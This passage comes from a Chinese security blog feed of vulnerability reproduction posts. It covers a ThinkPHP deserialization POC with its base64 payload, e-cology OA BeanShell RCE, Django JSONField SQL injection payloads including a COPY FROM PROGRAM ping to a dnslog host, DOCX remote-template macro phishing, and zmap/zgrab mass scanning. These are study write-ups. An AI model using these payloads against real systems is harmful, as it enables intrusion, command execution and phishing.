class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">          <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">              <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">              $value = call_user_func($filter, $value);</span><br></pre></td></tr></table></figure><ul><li>filterValue.value = 第一个通过GET请求的值input.data</li><li>filters.key = 第一个GET的键</li><li>filters.filters = input.filters</li></ul><p>上大佬的图</p><p><img src="https://img-blog.csdnimg.cn/20200107144450321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总的利用链<br><img src="https://img-blog.csdnimg.cn/20200107150410781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>到这里思路有了，回过头来看我们poc的利用过程，首先在上一步toArray()方法。创建了一个Request()对象，然后会触发poc里的__construct()方法，接着new Request()-&gt; visible($name)，该对象调用了一个不存在的方法会触发__call方法，看一下__construct()方法内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">'lin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"zeo"</span>=&gt;[<span class="string">"calc.exe"</span>,<span class="string">"calc"</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"zeo"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">'var_method'</span>       =&gt; <span class="string">'_method'</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">'var_pjax'</span>         =&gt; <span class="string">'_pjax'</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">'pathinfo_fetch'</span>   =&gt; [<span class="string">'ORIG_PATH_INFO'</span>, <span class="string">'REDIRECT_PATH_INFO'</span>, <span class="string">'REDIRECT_URL'</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">'default_filter'</span>   =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">'url_domain_root'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">'https_agent_name'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">'http_agent_ip'</span>    =&gt; <span class="string">'HTTP_X_REAL_IP'</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">'url_html_suffix'</span>  =&gt; <span class="string">'html'</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们把payload通过POST传过去，然后通过GET请求获取需要执行的命令</p><p>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJ6ZW8iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJ6ZW8iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjA6IiI7fX19fX19</p><p>复现成功<br><img src="https://img-blog.csdnimg.cn/20200107152900358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>参考文章<br><a href="https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/" target="_blank" rel="noopener">https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/</a><br><a href="https://blog.csdn.net/qq\_43380549/article/details/101265818" target="_blank" rel="noopener">https://blog.csdn.net/qq\_43380549/article/details/101265818</a><br><a href="https://xz.aliyun.com/t/6467" target="_blank" rel="noopener">https://xz.aliyun.com/t/6467</a><br><a href="https://xz.aliyun.com/t/6619" target="_blank" rel="noopener">https://xz.aliyun.com/t/6619</a><br><a href="https://www.t00ls.net/thread-54324-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-54324-1-1.html</a><br><a href="https://www.t00ls.net/viewthread.php\?tid=52825\&amp;extra=\&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php\?tid=52825\&amp;extra=\&amp;page=1</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】泛微 e-cology OA 远程代码执行漏洞复现</title>
      <link href="/2019/11/21/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/11/21/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>该漏洞位于 e-cology OA系统BeanShell组件中，并且该组件允许未授权访问，攻击者可通过访问该组件执行任意的Java代码，也就是说可以执行任意命令</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>包括但不限于7.0,8.0,8.1</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接在网站根目录后加入组件访问路径/weaver/bsh.servlet.BshServlet/</p><p>访问后直接在 Script 处输入Java代码点击 Evaluate 即可触发漏洞，并可以在Script Output处看到回显</p><p><img src="https://img-blog.csdnimg.cn/20191121165927935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】CVE-2019-14234 Django JSONField SQL注入漏洞复现</title>
      <link href="/2019/11/20/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/11/20/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】CVE-2019-14234-Django-JSONField-SQL注入漏洞复现"><a href="#【研究】CVE-2019-14234-Django-JSONField-SQL注入漏洞复现" class="headerlink" title="【研究】CVE-2019-14234 Django JSONField SQL注入漏洞复现"></a>【研究】CVE-2019-14234 Django JSONField SQL注入漏洞复现</h3><ul><li><ul><li><a href="#1_2">1.环境</a></li><li><a href="#2_7">2.原理</a></li><li><a href="#3_18">3.影响版本</a></li><li><a href="#4_25">4.利用过程</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br>直接使用vulhub的docker环境搭建<br>vulhub/django/CVE-2019-14234/</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。</p><p>Django通常搭配postgresql数据库，而JSONField是该数据库的一种数据类型。该漏洞的出现的原因在于Django中JSONField类的实现，Django的model最本质的作用是生成SQL语句，而在Django通过JSONField生成sql语句时，是通过简单的字符串拼接。<br>通过JSONField类获得KeyTransform类并生成sql语句的位置。<br>其中key_name是可控的字符串，最终生成的语句是WHERE (field-&gt;’[key_name]’) =<br>‘value’，因此可以进行SQL注入。<br><img src="https://img-blog.csdnimg.cn/20191120090215403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Django<br>1.11.x before 1.11.23<br>2.1.x before 2.1.11<br>2.2.x before 2.2.4</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>访问<a href="http://ip:8000/admin/login/\?next=/admin/" target="_blank" rel="noopener">http://ip:8000/admin/login/\?next=/admin/</a><br>输入用户名admin ，密码a123123123<br><img src="https://img-blog.csdnimg.cn/20191120090549944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>进入漏洞界面</p><p>然后访问<br><a href="http://ip:8000/admin/vuln/collection/" target="_blank" rel="noopener">http://ip:8000/admin/vuln/collection/</a></p><p><img src="https://img-blog.csdnimg.cn/20191120090803576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>手工测试看看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.130:8000/admin/vuln/collection/?detail__a'b=123</span></span><br></pre></td></tr></table></figure><p>报错出来 截断了<br><img src="https://img-blog.csdnimg.cn/20191120091112693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>命令执行语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.130:8000/admin/vuln/collection/?detail__title')='1' or 1=1 ;create table cmd_exec(cmd_output text)--</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191120091710227.png" alt="在这里插入图片描述"><br>这里应该是执行了，试一下DNSLog</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.130:8000/admin/vuln/collection/?detail__title')='1' or 1=1 ;copy cmd_exec FROM PROGRAM 'ping v62ce2.dnslog.cn'--</span></span><br></pre></td></tr></table></figure><p>ok成功了<br><img src="https://img-blog.csdnimg.cn/20191120092943327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用DOCX文档远程模板注入执行宏</title>
      <link href="/2019/10/28/%E5%88%A9%E7%94%A8DOCX%E6%96%87%E6%A1%A3%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%AE%8F/"/>
      <url>/2019/10/28/%E5%88%A9%E7%94%A8DOCX%E6%96%87%E6%A1%A3%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%AE%8F/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="利用DOCX文档远程模板注入执行宏"><a href="#利用DOCX文档远程模板注入执行宏" class="headerlink" title="利用DOCX文档远程模板注入执行宏"></a>利用DOCX文档远程模板注入执行宏</h2><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理</strong>：</h2><blockquote><p>与传统的宏启用文档相比，这种攻击的好处是多方面的。在对目标执行网络钓鱼攻击时，您可以将.docx的文档直接附加到电子邮件中，并且您不太可能根据文件的拓展名去阻止它。</p><p>Word远程模板执行宏就是利用Word文档加载附加模板时的缺陷所发起的恶意请求而达到的攻击目的，所以当目标用户点开攻击者发给他的恶意word文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。<br>这种攻击更常见的原因是，发送的文档本身是不带恶意代码的，能过很多静态的检测。</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="两个word文档"><a href="#两个word文档" class="headerlink" title="两个word文档"></a>两个word文档</h3><ol><li>第一个是启用宏的模板，或是.dotm文件，它将包含恶意VBA宏</li><li>第二个是看似没有危害的.docx文件，它本身不包含恶意代码，只有指向恶意模板文件的目标链接</li><li>cobalt strike</li></ol><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ol><li>直接用的cobalt strike生成的宏代码</li><li>就不啰嗦了<br><img src="https://img-blog.csdnimg.cn/20191025170218669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>自行测试宏是否生效<br><img src="https://img-blog.csdnimg.cn/20191025170810231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>生成一个正常的docx文件，内容根据实际需求进行编造，保存后将后缀改成zip</li><li>将其解压，修改./word/_rels/下的settings.xml.rels文件，没有的话可以自己添加。<br><img src="https://img-blog.csdnimg.cn/20191025172919941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li><strong>修改内容如下：</strong></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Relationship Id=<span class="string">"rId6"</span> Type=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span> Target=<span class="string">"fontTable.xml"</span>/&gt;&lt;<span class="regexp">/Relationships&gt;</span></span><br></pre></td></tr></table></figure><p>包含带有attachmentTemplate的Type的Relationship标记，是告诉Word打开该.docx时从哪里加载模板的设置，我们可以将Target值修改为远程位置。</p><ol start="7"><li>最后保存后重新压缩成zip，并修改后缀为docx，执行测试，能返回<br><img src="https://img-blog.csdnimg.cn/20191028153128221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ol>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Zgrab在Linux(kali)下载、安装、使用教程</title>
      <link href="/2019/10/18/Zgrab%E5%9C%A8Linux(kali)%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E3%80%81%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2019/10/18/Zgrab%E5%9C%A8Linux(kali)%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E3%80%81%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="下载、安装、使用"><a href="#下载、安装、使用" class="headerlink" title="下载、安装、使用"></a>下载、安装、使用</h3><ul><li><a href="#_2">介绍</a></li><li><a href="#Zgrab_9">安装Zgrab</a></li><li><ul><li><a href="#go_10">安装需要go环境</a></li><li><a href="#zgrab_28">安装zgrab</a></li></ul></li><li><a href="#_45">使用</a></li></ul><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Zgrab是基于ZMap无状态扫描的应用层扫描器，可以自定义数据包以及ip、domain之间的关联。可用于快速指纹识别爆破等场景。</p><p>最新版本的GitHub网址：<a href="https://github.com/zmap/zgrab2" target="_blank" rel="noopener">https://github.com/zmap/zgrab2</a></p><h1 id="安装Zgrab"><a href="#安装Zgrab" class="headerlink" title="安装Zgrab"></a>安装Zgrab</h1><h2 id="安装需要go环境"><a href="#安装需要go环境" class="headerlink" title="安装需要go环境"></a>安装需要go环境</h2><p>我的是在Linux环境安装go</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//studygolang.com/dl/golang/go1.12.7.linux-amd64.tar.gz</span></span><br><span class="line">tar -C /usr/local -xzf go1<span class="number">.12</span><span class="number">.7</span>.linux-amd64.tar.gz </span><br><span class="line"><span class="comment">//配置环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="comment">//在最后追加变量</span></span><br><span class="line">PATH=$PATH:<span class="regexp">/usr/</span>local/go/bin  </span><br><span class="line">GOPATH=<span class="regexp">/usr/</span>local/go/bin/ </span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><p>也可以添加临时环境变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> PATH=$PATH:<span class="regexp">/usr/</span>local/go/bin  </span><br><span class="line"><span class="keyword">export</span> GOPATH=<span class="regexp">/usr/</span>local/go/bin/</span><br></pre></td></tr></table></figure><h2 id="安装zgrab"><a href="#安装zgrab" class="headerlink" title="安装zgrab"></a>安装zgrab</h2><ul><li>正常安装</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go <span class="keyword">get</span> github.com/zmap/zgrab2</span><br><span class="line">cd $GOPATH/src/github.com/zmap/zgrab2</span><br><span class="line">make</span><br></pre></td></tr></table></figure><ul><li>但是一般会有问题 出现</li><li>cannot find package “golang.org/x/crypto/curve25519 解决方法</li><li><a href="https://blog.csdn.net/god\_zzZ/article/details/102622092" target="_blank" rel="noopener">https://blog.csdn.net/god\_zzZ/article/details/102622092</a> 可以看我的这个文章</li><li>解决在在安装</li><li>成功是这样</li><li></li></ul><p><img src="https://img-blog.csdnimg.cn/20191018113850144.png" alt="在这里插入图片描述"></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><strong>启动</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/go/bin/src/github.com/zmap/zgrab2</span><br><span class="line"> ./zgrab2 --help</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191018113901702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>命令 用法：</p><p>zgrab2 [选项] &lt;命令&gt;</p><p>应用选项：</p><p>-o, --output-file= 输出文件名， 使用 - 用于stdout（默认值： - ）</p><p>-f, --input-file= 输入文件名， 使用 - 用于stdin（默认值： - ）</p><p>-m, --metadata-file= 元数据文件名， 使用 - 用于stderr（默认值： - ）</p><p>-l, --log-file= 日志文件名，使用 - 用于stderr（默认值： - ）</p><p>-i, --interface= 要发送的网络接口</p><p>-s, --senders= 要使用的发送goroutine数（默认值：1000)</p><p>–debug 在输出中包含调试字段。</p><p>–gomaxprocs= 设置GOMAXPROCS（默认值：0）</p><p>–connections-per-host= 连接每台主机的次数（结果在更多输出中）（默认值：1）</p><p>–read-limit-per-host= 单个主机读取的最大总千字节数（默认96kb）（默认值：96）</p><p>–prometheus= 用于Prometheus服务器的地址（例如本地主机：8080）。如果为空，则禁用Prometheus。</p><blockquote><p>可用的命令：</p></blockquote><p>bacnet bacnet</p><p>banner Banner</p><p>dnp3 dnp3</p><p>fox fox</p><p>ftp FTP</p><p>http HTTP Banner Grab</p><p>imap imap</p><p>ipp ipp</p><p>modbus modbus</p><p>mongodb mongodb</p><p>mssql MSSQL</p><p>multiple Multiple module actions</p><p>mysql MySQL</p><p>ntp NTP</p><p>oracle oracle</p><p>pop3 pop3</p><p>postgres Postgres</p><p>redis redis</p><p>siemens siemens</p><p>smb smb</p><p>smtp smtp</p><p>ssh SSH Banner Grab</p><p>telnet telnet</p><p>tls TLS Banner Grab</p></blockquote><p>全球IP也可以从这里找到<br><a href="http://www.ipdeny.com/ipblocks/data/countries/cn.zone" target="_blank" rel="noopener">http://www.ipdeny.com/ipblocks/data/countries/cn.zone</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//www.ipdeny.com/ipblocks/data/countries/cn.zone</span></span><br></pre></td></tr></table></figure><p><strong>扫描出80端口的IP</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmap -w cn.zone -p 80 -B 100M -o 80.res  #扫描出80端口的IP</span><br></pre></td></tr></table></figure><p><strong>得到这些IP网页的源代码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zgrab2 -input-file=cn.res --output-file=hk.txt --senders=<span class="number">1000</span> http</span><br></pre></td></tr></table></figure><p><strong>扫完以后筛选</strong></p><p>cat hk.txt | grep “关键词”</p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cannot find package “golang.org/x/crypto/curve25519 解决方法</title>
